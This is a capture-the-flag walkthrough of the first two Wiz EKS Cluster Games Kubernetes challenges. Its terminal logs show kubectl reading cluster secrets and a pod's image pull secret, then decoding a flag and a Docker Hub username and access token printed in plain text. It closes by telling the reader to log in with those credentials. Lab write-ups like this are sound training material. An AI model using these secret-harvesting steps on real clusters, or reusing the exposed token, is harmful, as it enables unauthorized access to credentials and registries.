# EKS Cluster Games
# CTF Link: https://eksclustergames.com/
---
## [Challenge 1: Secret Seeker](https://eksclustergames.com/challenge/1)

The first task is about discovering a secret within the Kubernetes cluster.

## Solution

```bash
__        ___       _____ _  ______
\ \      / (_)____ | ____| |/ / ___|
 \ \ /\ / /| |_  / |  _| | ' /\___ \
  \ V  V / | |/ /  | |___| . \ ___) |
   \_/\_/  |_/___| |_____|_|\_\____/
  ____ _           _ _
 / ___| |__   __ _| | | ___ _ __   __ _  ___
| |   | '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \
| |___| | | | (_| | | |  __/ | | | (_| |  __/
 \____|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|
                                  |___/
Welcome to Wiz EKS Challenge!
For your convenience, the following directories are persistent across sessions:
        * /home/user
        * /tmp

Use kubectl to start!
root@wiz-eks-challenge:~# kubectl get secrets
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      528d
root@wiz-eks-challenge:~# kubectl get secrets -o yaml
apiVersion: v1
items:
- apiVersion: v1
  data:
    flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
  kind: Secret
  metadata:
    creationTimestamp: "2023-11-01T13:02:08Z"
    name: log-rotate
    namespace: challenge1
    resourceVersion: "890951"
    uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
  type: Opaque
kind: List
metadata:
  resourceVersion: ""
root@wiz-eks-challenge:~# echo "d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==" | base64 -d
wiz_eks_challenge{omg_over_privileged_secret_access}
root@wiz-eks-challenge:~#
```

---

---

## [Challeneg 2: Registry Hunt](https://eksclustergames.com/challenge/2)

A thing we learned during our research: always check the container registries.

## Solution

```bash
__        ___       _____ _  ______
\ \      / (_)____ | ____| |/ / ___|
 \ \ /\ / /| |_  / |  _| | ' /\___ \
  \ V  V / | |/ /  | |___| . \ ___) |
   \_/\_/  |_/___| |_____|_|\_\____/
  ____ _           _ _
 / ___| |__   __ _| | | ___ _ __   __ _  ___
| |   | '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \
| |___| | | | (_| | | |  __/ | | | (_| |  __/
 \____|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|
                                  |___/
Welcome to Wiz EKS Challenge!
For your convenience, the following directories are persistent across sessions:
        * /home/user
        * /tmp

Use kubectl to start!
root@wiz-eks-challenge:~# kubectl get pods
NAME                    READY   STATUS    RESTARTS       AGE
database-pod-2c9b3a4e   1/1     Running   14 (20d ago)   528d
root@wiz-eks-challenge:~# kubectl get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubernetes.io/psp: eks.privileged
      pulumi.com/autonamed: "true"
    creationTimestamp: "2023-11-01T13:32:05Z"
    name: database-pod-2c9b3a4e
    namespace: challenge2
    resourceVersion: "213766748"
    uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
  spec:
    containers:
    - image: eksclustergames/base_ext_image
      imagePullPolicy: Always
      name: my-container
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-cq4m2
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    imagePullSecrets:
    - name: registry-pull-secrets-780bab1d
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-cq4m2
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:05Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2025-03-23T06:44:23Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2025-03-23T06:44:23Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:05Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://4cd1857655feeac1bece44b800e910ee3e4e1968c2ceaa173d4d904b12c3b6e5
      image: docker.io/eksclustergames/base_ext_image:latest
      imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
      lastState:
        terminated:
          containerID: containerd://4b2d90a5566f9275c9aea6b9a9855be68c290230789949f8f937881d1d52b83b
          exitCode: 0
          finishedAt: "2025-03-23T06:44:22Z"
          reason: Completed
          startedAt: "2025-02-15T00:22:05Z"
      name: my-container
      ready: true
      restartCount: 14
      started: true
      state:
        running:
          startedAt: "2025-03-23T06:44:23Z"
    hostIP: 192.168.21.50
    phase: Running
    podIP: 192.168.12.173
    podIPs:
    - ip: 192.168.12.173
    qosClass: BestEffort
    startTime: "2023-11-01T13:32:05Z"
kind: List
metadata:
  resourceVersion: ""

root@wiz-eks-challenge:~# kubectl get secrets registry-pull-secrets-780bab1d -o yaml
apiVersion: v1
data:
  .dockerconfigjson: eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19
kind: Secret
metadata:
  annotations:
    pulumi.com/autonamed: "true"
  creationTimestamp: "2023-11-01T13:31:29Z"
  name: registry-pull-secrets-780bab1d
  namespace: challenge2
  resourceVersion: "897340"
  uid: 1348531e-57ff-42df-b074-d9ecd566e18b
type: kubernetes.io/dockerconfigjson
```
decode the token: https://jwt.io/

<img width="1303" alt="Screenshot 2025-04-13 at 11 40 48 AM" src="https://github.com/user-attachments/assets/6891bf49-9400-4275-a042-86f93d1fa770" />



```bash
root@wiz-eks-challenge:~# echo "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw==" | base64 -d
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
root@wiz-eks-challenge:~#
```


eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo

now login to docker using above credentials. and pull the image eksclustergames/base_ext_image





